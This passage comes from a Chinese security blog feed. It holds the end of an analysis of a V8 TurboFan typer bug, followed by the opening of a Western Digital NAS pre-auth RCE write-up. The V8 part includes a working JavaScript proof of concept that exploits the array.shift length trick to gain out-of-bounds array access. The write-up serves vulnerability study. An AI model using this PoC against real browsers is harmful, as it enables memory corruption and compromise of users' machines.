class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">FeedbackTypeOf</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">    Type type = GetInfo(node)-&gt;feedback_type();</span><br><span class="line">    <span class="keyword">return</span> type.IsInvalid() ? Type::None() : type;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">UpdateFeedbackType</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    Type input0_type;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;InputCount() &gt; <span class="number">0</span>) input0_type = FeedbackTypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type input1_type;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;InputCount() &gt; <span class="number">1</span>) input1_type = FeedbackTypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> DECLARE_CASE(Name)                                               \</span></span><br><span class="line">    <span class="keyword">case</span> IrOpcode::k##Name: &#123;                                              \</span><br><span class="line">        new_type = Type::Intersect(op_typer_.Name(input0_type, input1_type), \</span><br><span class="line">                                info-&gt;restriction_type(), graph_zone());  \</span><br><span class="line">        <span class="keyword">break</span>;                                                               \</span><br><span class="line">    &#125;</span><br><span class="line">    SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(DECLARE_CASE)</span><br><span class="line">    SIMPLIFIED_SPECULATIVE_BIGINT_BINOP_LIST(DECLARE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> DECLARE_CASE</span></span><br><span class="line">...</span><br><span class="line">    GetInfo(node)-&gt;set_feedback_type(new_type);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(V) \</span></span><br><span class="line">....</span><br><span class="line">  V(SpeculativeNumberBitwiseOr)  </span><br><span class="line">  V(SpeculativeSafeIntegerAdd)                      \</span><br><span class="line">  V(SpeculativeSafeIntegerSubtract)</span><br></pre></td></tr></table></figure><p>首先对左值和右值输入节点调用FeedbackTypeOf函数，这个函数会去确定该节点对应的nodeinfo上是否有feedback字段被设置，如果有则代表该输入节点的类型在retype的时候被更新了，需要取该类型作为实际的类型信息，否则代表没有更新，和之前typer阶段分析的一致，直接取原本的type即可，最终得到input0_type和input1_type。</p><p>这个宏看上去很不好理解，但其实意思就是对于<br>SpeculativeSafeIntegerAdd节点，先根据input0_type和input1_type，重新调用SpeculativeSafeIntegerAdd运算符的type函数，计算出一个类型，其应该是Range(0, 2147483648)。</p><p>然后将这个结果和<code>restriction_type</code>即Signed32取交集，而Signed32的范围应该是(-2147483648,2147483647)，最终得到Feedback type是Range(0, 2147483647)，并将这个结果更新到节点对于nodeinfo的feedback_type字段上。</p><p>SpeculativeNumberBitwiseOr同理，由于SpeculativeSafeIntegerAdd的类型作为input0_type已经被更新了，所以调用SpeculativeNumberBitwiseOr的type函数将计算出一个新的类型，作为Feedback type传播下去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#47:SpeculativeNumberBitwiseOr[SignedSmall](#45:SpeculativeSafeIntegerAdd, #46:NumberConstant, #45:SpeculativeSafeIntegerAdd, #38:Merge)  </span><br><span class="line">[Static type: Range(-2147483648, 2147483647), </span><br><span class="line">Feedback type: Range(0, 2147483647)]</span><br><span class="line"> visit #47: SpeculativeNumberBitwiseOr</span><br><span class="line">  &#x3D;&#x3D;&gt; output kRepWord32</span><br></pre></td></tr></table></figure><p>Retype phase除了调用UpdateFeedbackType更新信息，还会调用VisitNode函数设置节点的respresentation，但这和这个漏洞无关，略过不表。</p><h3 id="Lower-phase"><a href="#Lower-phase" class="headerlink" title="Lower phase"></a>Lower phase</h3><p>现在，每个节点都已经和它的使用信息(truncation)和output representation关联了。</p><p>最后将反向的遍历所有节点，进行lower</p><ul><li>将节点本身lower到更具体的节点（通过DeferReplacement）</li><li>当该节点的的output representation与此输入的预期使用信息不匹配时，对节点进行转换（插入ConvertInput），比如对于一个representation是kSigned的node1，若其use节点node2会将其truncation到kWord64，则将会插入ConvertInput函数对该节点进行转换。</li></ul><p>于是对于poc里的<code>z &lt; 0</code>,由于z的类型已经被更新到了(0, 2147483647)，这个范围显然是在Unsigned32OrMinusZero里的，所以满足第一个if判断。</p><p>于是最终将NumberLessThan节点给lower到了Uint32Op。<br>但实际上z的值是|0x80000000|，其被当成uint32解析的话就是+0x80000000，这个值显然大于0，所以出现了和之前解释执行时候不一样的结果false。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kNumberLessThan:</span><br><span class="line"><span class="keyword">case</span> IrOpcode::kNumberLessThanOrEqual: &#123;</span><br><span class="line">  Type <span class="keyword">const</span> lhs_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">  Type <span class="keyword">const</span> rhs_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">  <span class="comment">// Regular number comparisons in JavaScript generally identify zeros,</span></span><br><span class="line">  <span class="comment">// so we always pass kIdentifyZeros for the inputs, and in addition</span></span><br><span class="line">  <span class="comment">// we can truncate -0 to 0 for otherwise Unsigned32 or Signed32 inputs.</span></span><br><span class="line">  <span class="keyword">if</span> (lhs_type.Is(Type::Unsigned32OrMinusZero()) &amp;&amp;</span><br><span class="line">      rhs_type.Is(Type::Unsigned32OrMinusZero())) &#123;</span><br><span class="line">    <span class="comment">// =&gt; unsigned Int32Cmp</span></span><br><span class="line">    VisitBinop&lt;T&gt;(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                  MachineRepresentation::kBit);</span><br><span class="line">    <span class="keyword">if</span> (lower&lt;T&gt;()) ChangeOp(node, Uint32Op(node));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.Is(Type::Signed32OrMinusZero()) &amp;&amp;</span><br><span class="line">             rhs_type.Is(Type::Signed32OrMinusZero())) &#123;</span><br><span class="line">    <span class="comment">// =&gt; signed Int32Cmp</span></span><br><span class="line">    VisitBinop&lt;T&gt;(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                  MachineRepresentation::kBit);</span><br><span class="line">    <span class="keyword">if</span> (lower&lt;T&gt;()) ChangeOp(node, Int32Op(node));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// =&gt; Float64Cmp</span></span><br><span class="line">    VisitBinop&lt;T&gt;(node, UseInfo::TruncatingFloat64(kIdentifyZeros),</span><br><span class="line">                  MachineRepresentation::kBit);</span><br><span class="line">    <span class="keyword">if</span> (lower&lt;T&gt;()) ChangeOp(node, Float64Op(node));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="array-shift-trick"><a href="#array-shift-trick" class="headerlink" title="array.shift trick"></a>array.shift trick</h3><p>这个漏洞的原理至此已经分析清楚了，那么我们简单的来浏览一下这个漏洞的typer exploit trick。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先假设我们能让l的类型在typer阶段被推断成Range(-1,0)</span></span><br><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(l);</span><br><span class="line">arr.shift();</span><br></pre></td></tr></table></figure><h4 id="TFBytecodeGraphBuilder"><a href="#TFBytecodeGraphBuilder" class="headerlink" title="TFBytecodeGraphBuilder"></a>TFBytecodeGraphBuilder</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-083027.png" alt=""></p><h4 id="TFInlining"><a href="#TFInlining" class="headerlink" title="TFInlining"></a>TFInlining</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-084802.png" alt=""><br><code>#81</code>也就是array.shift将被Reduce成这些节点，我们重点关注StoreField[+12]即可，因为这代表的是重新为array的length字段赋值。</p><p>这部分IR对应的伪代码如下，摘自zer0con PPT原文。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* JSCallReducer::ReduceArrayPrototypeShift */</span></span><br><span class="line">let length = LoadField(arr, kLengthOffset); <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">100</span>) &#123; </span><br><span class="line">        DoShiftElementsArray(); <span class="comment">// Don't care </span></span><br><span class="line">        <span class="comment">/* Update length field */</span></span><br><span class="line">        let newLen = length - <span class="number">1</span>; </span><br><span class="line">        StoreField(arr, kLengthOffset, newLen);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="comment">/* length &gt; 100 */</span> &#123;</span><br><span class="line">        CallRuntime(ArrayShift);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果关注IR图的话，关注下面这部分就行了，可以看出先LoadField[+12]，然后对其减1，再StoreField[+12]回去。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-085247.png" alt=""></p><h4 id="TFTypedLowering"><a href="#TFTypedLowering" class="headerlink" title="TFTypedLowering"></a>TFTypedLowering</h4><p>如图就是#JSCreateArray在TypedLowering phase被reduce后的IR。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-085837.png" alt=""><br>伪代码如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSCreateLowering::ReduceJSCreateArray </span></span><br><span class="line"><span class="comment">// JSCreateLowering::ReduceNewArray </span></span><br><span class="line">let limit = kInitialMaxFastElementArray; <span class="comment">// limit : NumberConstant[16380]</span></span><br><span class="line"><span class="comment">// len : Range(-1, 0), real: 1</span></span><br><span class="line">let checkedLen = CheckBounds(len, limit); <span class="comment">// checkedLen : Range(0, 0), real: 1</span></span><br><span class="line">let arr = Allocate(kArraySize); </span><br><span class="line">StoreField(arr, k[Map|Prop|Elem]Offset, ...);</span><br><span class="line">StoreField(arr, kLengthOffset, checkedLen);</span><br></pre></td></tr></table></figure><h4 id="TFLoadElimination"><a href="#TFLoadElimination" class="headerlink" title="TFLoadElimination"></a>TFLoadElimination</h4><p>有趣的是将上面这些reduce后的结果连起来看，会发现对length先Store，再Load，再减去一个-1，再Store，这是不是过于冗杂了呢，v8对其会进行一定的优化。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-090745.png" alt=""></p><p>篇幅所限，略去不表，以后有空我再单独写一篇讲LoadElimination的漏洞的文章，总之最终优化后，首先会直接将<code>#154 CheckBounds</code>作为<code>#133 NumberSubtract</code>的左值输入。</p><p>然后由于之前Typer分析的时候CheckBounds的范围是(0,0)，这显然是一个常量，而<code>#44</code>也是一个常量1，所以<code>#133</code>在其输入更新后，它的type也被更新成了-1，随后就被常量折叠掉，于是最终得到的IR图如下。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-091745.png" alt=""></p><p>最终伪代码如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let limit = kInitialMaxFastElementArray; <span class="comment">// limit : NumberConstant[16380]</span></span><br><span class="line"><span class="comment">// len : Range(-1, 0), real: 1</span></span><br><span class="line">let checkedLen = CheckBounds(len, limit); <span class="comment">// checkedLen : Range(0, 0), real: 1</span></span><br><span class="line">let arr = Allocate(kArraySize); </span><br><span class="line">StoreField(arr, kMapOffset, <span class="built_in">map</span>); </span><br><span class="line">StoreField(arr, kPropertyOffset, property); </span><br><span class="line">StoreField(arr, kElementOffset, element);</span><br><span class="line">StoreField(arr, kLengthOffset, checkedLen);</span><br><span class="line"></span><br><span class="line">let length = checkedLen;</span><br><span class="line"><span class="comment">// length: Range(0, 0), real: 1</span></span><br><span class="line"><span class="keyword">if</span> (length != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (length &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        DoShiftElementsArray(); </span><br><span class="line">        <span class="comment">/* Update length field */</span></span><br><span class="line">        StoreField(arr, kLengthOffset, <span class="number">-1</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="comment">/* length &gt; 100 */</span> </span><br><span class="line">    &#123;</span><br><span class="line">        CallRuntime(ArrayShift);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上到目前为止一切就比较清晰了，只要我们<strong>能让length通过CheckBounds的检查，并且其值不等于0且小于等于100</strong>，就能在<code>arr.shift</code>之后让arr的length被置为-1，即0xffffffff，就实现arr的越界读写了。</p><h3 id="最终的oob-poc"><a href="#最终的oob-poc" class="headerlink" title="最终的oob poc"></a>最终的oob poc</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">0x7fffffff</span>;</span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NaN</span>) y = <span class="literal">NaN</span>; </span><br><span class="line">  <span class="keyword">if</span> (a) y = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">let</span> z = (y + <span class="number">1</span>) + <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> l = <span class="number">0</span> - <span class="built_in">Math</span>.sign(z);</span><br><span class="line">  <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(l);</span><br><span class="line">  arr.shift();</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(foo);</span><br><span class="line">foo(<span class="literal">true</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(foo(<span class="literal">false</span>).length);</span><br></pre></td></tr></table></figure><p>事实上很有趣的一件事情是:</p><ol><li>Retype前后的NumberSign的范围都是(0,1)，<code>let l = 0 - Math.sign(z)</code>在Retype前后的范围都是(-1,0)，没有变化。</li><li>补丁前后，影响的也只是<code>let z = (y + 1) + 0</code>的范围从(0, 2147483647)，变成了(0, 2147483648)，补丁前后不影响NumberSign的范围，所以也不会影响CheckBounds的范围，也就不会影响<code>array.shift</code>部分生成的IR。</li></ol><ul><li>补丁前:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-093116.png" alt=""></li><li>补丁后:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-093745.png" alt=""></li></ul><p>所以无论补丁前还是补丁后，上面<code>array.shift</code>部分生成的IR都没有变化。<br>那么难道补丁之后，我们还可以执行到<code>StoreField(arr, kLengthOffset, -1);</code>,从而得到OOB吗？毕竟这部分代码都还在，它没有变化。</p><p>显然不可能，事实上补丁影响到的是对NumberSign的lower，它会根据以下逻辑来计算出是-1还是1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Int32Add...</span><br><span class="line">if ChangeInt32ToFloat64 &lt; 0:</span><br><span class="line">    Select -1</span><br><span class="line">else:</span><br><span class="line">    Select 1</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-04-30-094418.png" alt=""></p><p>在补丁前，Int32Add(0x7fffffff, 1)之后ChangeInt32ToFloat64得到的是-0x80000000,显然小于0，得到-1，然后带入<code>let l = 0 - Math.sign(z)</code>运算得到length为1，于是可以通过CheckBounds的检查，最后实现OOB。</p><p>但若是在补丁后，该伪代码将变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Int32Add...</span><br><span class="line">if ChangeUInt32ToFloat64 &lt; 0:</span><br><span class="line">    Select -1</span><br><span class="line">else:</span><br><span class="line">    Select 1</span><br></pre></td></tr></table></figure><p>于是在补丁后，Int32Add(0x7fffffff, 1)之后ChangeUInt32ToFloat64得到的是0x80000000，显然大于0，得到1，然后计算出的length是-1，显然不能通过CheckBounds的检查，所以即使有可以导致OOB的分支在，也无法执行进去。</p><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="Int32Add从哪来"><a href="#Int32Add从哪来" class="headerlink" title="Int32Add从哪来"></a>Int32Add从哪来</h4><p>补丁前后SpeculativeSafeIntegerAdd都会被lower到Int32Add，这部分逻辑其实在这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lower&lt;T&gt;()) &#123;</span><br><span class="line">  <span class="keyword">if</span> (truncation.IsUsedAsWord32() ||</span><br><span class="line">      !CanOverflowSigned32(node-&gt;op(), left_feedback_type,</span><br><span class="line">                           right_feedback_type, type_cache_,</span><br><span class="line">                           graph_zone())) &#123;</span><br><span class="line">    ChangeToPureOp(node, Int32Op(node));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ChangeToInt32OverflowOp(node);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>truncation.IsUsedAsWord32()</code>，只要满足这个条件，就会生成Int32Op，而要满足这个条件，目前看<code>add | 0</code>或者<code>add +- 0</code>这种都可以产生截断到word32。</p><h4 id="如何产生SpeculativeSafeIntegerAdd节点"><a href="#如何产生SpeculativeSafeIntegerAdd节点" class="headerlink" title="如何产生SpeculativeSafeIntegerAdd节点"></a>如何产生SpeculativeSafeIntegerAdd节点</h4><p>事实上如果从poc里去掉下面这句就不会创建出SpeculativeSafeIntegerAdd节点了，这是因为v8的启发式JIT在收集执行信息的时候，在进行add的时候，发现<code>y + 1</code>始终是进行的SignedSmall的add，所以会创建出SpeculativeSafeIntegerAdd。</p><p>如果没有这句，那么显然<code>y + 1</code>不可能是在SignedSmall范围内计算了，就会生成NumberAdd节点，也就不会走到存在漏洞的路径。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a) y = <span class="number">-1</span>;<span class="comment">// The next condition holds only in the warmup run. It leads to Smi (SignedSmall) feedback being collected for the addition below.</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>十分感谢刘耕铭精彩的分享:)</p><ul><li><a href="https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/" target="_blank" rel="noopener">https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/</a></li><li><a href="https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf" target="_blank" rel="noopener">https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇主要是对zer0con2021上chrome exploitation议题v8部分的解读。&lt;/p&gt;
&lt;p&gt;这个漏洞发生在Simplifi
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="cpp" scheme="http://eternalsakura13.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用</title>
    <link href="http://eternalsakura13.com/2021/01/31/nas/"/>
    <id>http://eternalsakura13.com/2021/01/31/nas/</id>
    <published>2021-01-31T06:07:55.273Z</published>
    <updated>2021-05-08T08:16:47.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sakuraの从零开始のIoT漏洞挖掘系列-一-Western-Digital-My-Cloud-Pro系列PR4100-NAS认证前RCE漏洞分析与利用"><a href="#sakuraの从零开始のIoT漏洞挖掘系列-一-Western-Digital-My-Cloud-Pro系列PR4100-NAS认证前RCE漏洞分析与利用" class="headerlink" title="sakuraの从零开始のIoT漏洞挖掘系列(一): Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用"></a>sakuraの从零开始のIoT漏洞挖掘系列(一): Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>本文主要是对crowdstrike团队的<a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/" target="_blank" rel="noopener">pwn2own-tale-of-a-bug-found-and-lost-again</a>文章进行学习，并梳理漏洞模式和探究漏洞利用方法，因为笔者手上没有这款固件，如果有人手上有或者用qemu仿真出来了，可以自己调试一下。</p><h2 id="FIRMWARE"><a href="#FIRMWARE" class="headerlink" title="FIRMWARE"></a>FIRMWARE</h2><p>首先下载有漏洞的固件，该漏洞从2.31.204版本开始，一直在5.04.114版本修复，跨度长达一年，还是十分值得学习的。<br><a href="https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v2.40.155_20200713.tar.gz" target="_blank" rel="noopener">https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v2.40.155_20200713.tar.gz</a></p><h2 id="攻击面枚举"><a href="#攻击面枚举" class="headerlink" title="攻击面枚举"></a>攻击面枚举</h2><p>因为是从零开始的IoT漏洞挖掘，从本篇开始我们首先讲述一下，在开始挖掘漏洞之前，我们需要做什么。第一件事就是要枚举攻击面，即这个目标它起了哪些服务，然后哪些服务是从外网可以访问。<br>一般可以用<a href="https://linux.die.net/man/8/netstat" target="_blank" rel="noopener">Netstat</a>来看这些东西。</p><ul><li><code>netstat -tulpn</code><ul><li><code>-t</code> tcp</li><li><code>-u</code> udp</li><li><code>-l</code> listening, Show only listening sockets.</li><li><code>-n</code> Show numerical addresses instead of trying to determine symbolic host, port or user names.</li><li><code>-p</code> Show the PID and name of the program to which each socket belongs.</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@MyCloudPR4100 root # netstat -tulpn</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Local Address           Foreign Address State  PID&#x2F;Program name</span><br><span class="line">tcp   0.0.0.0:443             0.0.0.0:*       LISTEN 3320&#x2F;httpd         </span><br><span class="line">tcp   127.0.0.1:4700          0.0.0.0:*       LISTEN 4131&#x2F;cnid_metad</span><br><span class="line">tcp   0.0.0.0:445             0.0.0.0:*       LISTEN 4073&#x2F;smbd</span><br><span class="line">tcp   192.168.178.31:49152    0.0.0.0:*       LISTEN 3746&#x2F;upnp_nas_devic</span><br><span class="line">tcp   0.0.0.0:548             0.0.0.0:*       LISTEN 4130&#x2F;afpd</span><br><span class="line">tcp   0.0.0.0:3306            0.0.0.0:*       LISTEN 3941&#x2F;mysqld</span><br><span class="line">tcp   0.0.0.0:139             0.0.0.0:*       LISTEN 4073&#x2F;smbd</span><br><span class="line">tcp   0.0.0.0:80              0.0.0.0:*       LISTEN 3320&#x2F;httpd </span><br><span class="line">tcp   0.0.0.0:8181            0.0.0.0:*       LISTEN 1609&#x2F;restsdk-server</span><br><span class="line">tcp   0.0.0.0:22              0.0.0.0:*       LISTEN 2761&#x2F;sshd</span><br><span class="line">tcp6  :::445                  :::*            LISTEN 4073&#x2F;smbd</span><br><span class="line">tcp6  :::139                  :::*            LISTEN 4073&#x2F;smbd</span><br><span class="line">tcp6  :::22                   :::*            LISTEN 2761&#x2F;sshd</span><br><span class="line">udp   0.0.0.0:1900            0.0.0.0:*              3746&#x2F;upnp_nas_devic</span><br><span class="line">udp   0.0.0.0:24629           0.0.0.0:*              2076&#x2F;mserver</span><br><span class="line">udp   172.17.255.255:137      0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   172.17.42.1:137         0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   192.168.178.255:137     0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   192.168.178.31:137      0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   0.0.0.0:137             0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   172.17.255.255:138      0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   172.17.42.1:138         0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   192.168.178.255:138     0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   192.168.178.31:138      0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   0.0.0.0:138             0.0.0.0:*              4077&#x2F;nmbd</span><br><span class="line">udp   0.0.0.0:30958           0.0.0.0:*              3808&#x2F;apkg</span><br><span class="line">udp   0.0.0.0:514             0.0.0.0:*              1958&#x2F;syslogd</span><br><span class="line">udp   127.0.0.1:23457         0.0.0.0:*              3985&#x2F;wdmcserver</span><br><span class="line">udp   127.0.0.1:46058         0.0.0.0:*              3746&#x2F;upnp_nas_devic</span><br><span class="line">udp   0.0.0.0:48299           0.0.0.0:*              2481&#x2F;avahi-daemon:</span><br><span class="line">udp   0.0.0.0:5353            0.0.0.0:*              2481&#x2F;avahi-daemon:</span><br></pre></td></tr></table></figure><p>一般看到httpd就可以确定这可能是使用了apache来做的服务端，所以再搜一下conf配置文件，一般以我的习惯会把每个conf文件都读一下，不过这里我们主要关注一下<code>alias.conf</code>和<code>rewrite.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 